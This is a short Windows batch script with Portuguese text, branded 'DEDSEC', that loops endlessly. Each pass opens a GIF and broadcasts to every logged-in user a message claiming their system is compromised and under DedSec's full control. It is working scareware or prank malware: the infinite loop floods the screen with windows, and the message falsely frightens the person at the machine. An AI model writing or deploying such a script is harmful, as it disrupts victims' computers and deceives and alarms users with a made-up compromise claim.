@echo off
title [DEDSEC] Janelas de Aviso Infinitas
color 0a
echo [DEDSEC] Preparando apra o show...
REM Loop infinito para criar janelas de aviso
:loop
start "" "%local_folder%dedsec.gif"
msg * "Seu sistema está comprometido. A DedSec tem controle total."
goto loop